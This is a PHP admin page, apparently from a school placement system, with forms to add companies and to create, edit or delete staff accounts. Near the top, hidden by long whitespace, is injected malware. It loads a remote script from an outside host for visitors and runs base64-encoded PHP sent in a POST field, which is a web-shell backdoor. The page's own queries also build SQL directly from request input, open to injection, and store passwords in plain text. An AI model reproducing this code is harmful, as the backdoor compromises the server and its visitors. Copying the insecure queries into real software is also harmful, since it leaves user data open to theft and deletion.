<link href="resources/estilos.css" rel="stylesheet" type="text/css">

<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 if (isset($_GET['guardarempresa'])) { 

	$nombre = $_POST['nombre'];
	$gerente = $_POST['gerente'];
	$direccion = $_POST['direccion'];
	$cp = $_POST['cp'];
	$poblacion = $_POST['poblacion'];
	$provincia = $_POST['provincia'];
	$telf1 = $_POST['telf1'];
	$fax = $_POST['fax'];
	$cif = $_POST['cif'];
	$curs = $_POST['curs'];
	$familia = $_POST['familia'];
	$evalua = $_POST['evalua'];
	$evalub = $_POST['evalub'];
	$concert = $_POST['concert'];
	
	$familia2 = $_POST['familia2'];
	$familia3 = $_POST['familia3'];
	$familia4 = $_POST['familia4'];
	
	$result2 = $db->Execute("SELECT * FROM CDE_empresas_BACK2 WHERE cif = '$cif'");
	if ($db->Affected_Rows() === 0) {
		
		$result = $db->Execute("INSERT INTO CDE_empresas_BACK2(empresa, responsable, direccion, cp, ciutat, provincia, telf, fax, cif, curs, familia, evaluacio, concert, familia2, familia3, familia4, evalua_anterior) VALUES ('$nombre', '$gerente', '$direccion', '$cp', '$poblacion', '$provincia', '$telf1', '$fax', '$cif', '$curs', '$familia', '$evalua', '$concert', '$familia2', '$familia3', '$familia4', '$evalub')"); 
	}
	
} ?>

<?php if (isset($_GET['borrarusuario'])) { 

	$borrarusuario = $_GET['borrarusuario'];
	$result = $db->Execute("DELETE FROM usuarios WHERE id = $borrarusuario");

} ?>

<?php if (isset($_GET['actuuser'])) { 

	$idus = $_GET['actuuser'];
	$nombre = $_POST['nombre'];
	$pass = $_POST['pass'];
	$nivel = $_POST['nivel'];
	
	$result = $db->Execute("UPDATE usuarios SET nombre = '$nombre' WHERE id = $idus");
	$result = $db->Execute("UPDATE usuarios SET pass = '$pass' WHERE id = $idus");
	$result = $db->Execute("UPDATE usuarios SET nivel = '$nivel' WHERE id = $idus");
	
	} 

?>

<?php if (isset($_GET['guardaruser'])) { 

	$nombre = $_POST['nombre'];
	$pass = $_POST['pass'];
	$nivel = $_POST['nivel'];
	
	$result = $db->Execute("INSERT INTO usuarios (nombre, pass, nivel) VALUES ('$nombre', '$pass', '$nivel')"); } 

?>

<form id="form1" name="form1" method="post" action="index.php?menu=3&sub=1&guardarempresa" style="margin:0px">
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Añadir nueva Empresa</td>
                      </tr>
                    </table>
  <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
    <tr>
      <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Nombre</td>
      <td width="170" bgcolor="#F8F8F8"><label>
          <input name="nombre" type="text" class="texte_normal" id="nombre" />
      </label></td>
    </tr>
    <tr>
      <!--
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Convenio</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="convenio" type="text" class="texte_normal" id="textfield2" />
                        </label></td>
                       -->
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Gerente</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="gerente" type="text" class="texte_normal" id="textfield2" />
      </label></td>
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Dirección</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="direccion" type="text" class="texte_normal" id="textfield3" />
      </label></td>
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;CP</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="cp" type="text" class="texte_normal" id="textfield4" />
      </label></td>
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Poblacion</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="poblacion" type="text" class="texte_normal" id="textfield4" />
      </label></td>
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Provincia</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="provincia" type="text" class="texte_normal" id="textfield3" />
      </label></td>
    </tr>
    <tr><!--
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Contacto 1</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="contacto1" type="text" class="texte_normal" id="textfield3" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Carrec 1</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="carrec1" type="text" class="texte_normal" id="textfield4" />
                        </label></td> -->
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Telf</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="telf1" type="text" class="texte_normal" id="textfield8" />
      </label></td>
    </tr>
    <tr><!--
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Email</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="email1" type="text" class="texte_normal" id="textfield7" />
                        </label></td>-->
    </tr>
    <tr><!--
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Contacto 2</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="contacto2" type="text" class="texte_normal" id="textfield6" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Carrec 2</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="carrec2" type="text" class="texte_normal" id="textfield5" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Telf 2</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="telf2" type="text" class="texte_normal" id="textfield13" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Email 2</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="email2" type="text" class="texte_normal" id="textfield12" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Telf Empresa</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="telfempresa" type="text" class="texte_normal" id="textfield11" />
                        </label></td>-->
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Fax</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="fax" type="text" class="texte_normal" id="textfield10" />
      </label></td>
    </tr>
    <tr><!--
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Email Empresa</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="emailempresa" type="text" class="texte_normal" id="textfield17" />
                        </label></td> -->
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;CIF*</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="cif" type="text" class="texte_normal" id="textfield16" maxlength="9" />
      </label></td>
    </tr>
    <tr><!--
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Data Convenio</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="dataconveni" type="text" class="texte_normal" id="textfield15" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Notas</td>
                        <td bgcolor="#F8F8F8"><label>
                          <textarea name="notes" rows="4" class="texte_normal" id="textfield14"></textarea>
                        </label></td> -->
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Curso</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="curs" type="text" class="texte_normal" id="textfield9" />
      </label></td>
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Familia 1</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="familia" type="text" class="texte_normal" id="textfield6" />
      </label></td>
    </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Familia 2</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="familia2" type="text" class="texte_normal" id="textfield11" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Familia 3</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="familia3" type="text" class="texte_normal" id="textfield13" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Familia 4</td>
                        <td bgcolor="#F8F8F8"><label>
                          <input name="familia4" type="text" class="texte_normal" id="textfield14" />
                        </label></td>
                      </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Eval. Actual</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="evalua" type="text" class="texte_normal" id="textfield5" />
      </label></td>
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Eval. Anterior</td>
      <td bgcolor="#F8F8F8"><label>
        <input name="evalub" type="text" class="texte_normal" id="textfield15" />
      </label></td>
    </tr>
    <tr>
      <td height="22" bgcolor="#F8F8F8">&nbsp;Concert</td>
      <td bgcolor="#F8F8F8"><label>
          <input name="concert" type="text" class="texte_normal" id="textfield7" maxlength="4" />
      </label></td>
    </tr>
                      
    <tr>
      <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
      <td align="left" bgcolor="#F8F8F8"><label>
          <input name="button" type="submit" class="texte_normal" id="button" value="Guardar" />
      </label></td>
    </tr>
  </table>
  </form><br />
                  
                  <form id="form2" name="form1" method="post" action="index.php?menu=3&amp;sub=1&guardaruser" style="margin:0px">
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                        <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Añadir nuevo Usuario</td>
                      </tr>
                    </table>
                    <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                      <tr>
                        <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Nombre</td>
                        <td width="170" bgcolor="#F8F8F8"><label>
                          <input name="nombre" type="text" class="texte_normal" id="nombre" />
                        </label></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Contraseña</td>
                        <td bgcolor="#F8F8F8"><input name="pass" type="text" class="texte_normal" id="textfield" /></td>
                      </tr>
                      <tr>
                        <td height="22" bgcolor="#F8F8F8">&nbsp;Permisos</td>
                        <td bgcolor="#F8F8F8"><label>
                          <select name="nivel" class="texte_normal" id="nivel">
                            <option value="1">Admin</option>
                            <option value="3">Jefe Dpt</option>
                            <option value="5">Profesor</option>
                          </select>
                        </label></td>
                      </tr>
                      <tr>
                        <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                        <td align="left" bgcolor="#F8F8F8"><label>
                          <input name="button2" type="submit" class="texte_normal" id="button2" value="Guardar" />
                        </label></td>
                      </tr>
                    </table>
                  </form> 
                  
                  <br />
                  <table width="290" border="0" align="center" cellpadding="0" cellspacing="0">
                    <tr>
                      <td height="22" bgcolor="#000000" class="texte_normal_blanco">&nbsp;&nbsp;Usuarios creados</td>
                    </tr>
                  </table>
                  <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                    <tr>
                      <td colspan="2" bgcolor="#F8F8F8">
                      <?php
                      $result = $db->Execute("SELECT * FROM usuarios ORDER BY id ASC");
					  while (!$result->EOF) {
							$id = $result->fields[0];
							$nombre = $result->fields[1];
							$pass = $result->fields[2];
							$nivel = $result->fields[3];

					  ?>
                      <form id="form3" name="form3" method="post" action="index.php?menu=3&amp;sub=1&actuuser=<?php echo $id?>" style="margin:0px">
                      <table width="280" border="0" align="center" cellpadding="0" cellspacing="0">
                      <tr>
                          <td height="22"><label>
                            <input name="nombre" type="text" class="texte_normal" id="nombre" value="<?php echo $nombre ?>" size="8" />
                        </label></td>
                          <td><input name="pass" type="text" class="texte_normal" id="textfield12" value="<?php echo $pass ?>" size="6" />
                            <select name="nivel" class="texte_mini" id="nivel">
                              <option value="1" <?php if($nivel==1) { ?>selected="selected"<?php } ?>>Admin</option>
                              <option value="3" <?php if($nivel==3) { ?>selected="selected"<?php } ?>>Jefe Dpt</option>
                              <option value="5" <?php if($nivel==5) { ?>selected="selected"<?php } ?>>Profesor</option>
                          </select></td>
                        <td width="24"><label>
                          <input name="button3" type="submit" class="texte_mini" id="button3" value="ok" />
                        </label></td>
                          <td width="24" align="center"><a href="index.php?menu=3&amp;sub=1&amp;borrarusuario=<?php echo $id ?>"><img src="resources/ico_m_del.png" width="16" height="16" border="0" /></a></td>
                        </tr>
                      </table>
                      </form>
                      <?php
					  		$result->MoveNext();
							}
					  ?>
                      
                      </td>
                    </tr>
                  </table>
